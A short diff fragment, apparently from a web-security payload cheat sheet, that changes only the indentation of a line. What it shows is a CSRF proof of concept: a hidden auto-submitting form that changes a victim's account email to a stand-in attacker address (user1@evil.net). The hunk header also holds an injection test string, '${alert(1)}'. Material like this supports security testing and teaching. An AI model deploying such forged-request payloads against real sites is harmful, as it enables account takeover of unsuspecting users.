@@ -3033,7 +3033,7 @@ ${alert(1)}
 **Simple PoC**
 ```HTML
 <form method="POST" action="https://VICTIM/my-account/settings/change-email">
-    <input type="hidden" name="email" value="user1%40evil.net">
+        <input type="hidden" name="email" value="user1%40evil.net">
 </form>
 <script>
         document.forms[0].submit();
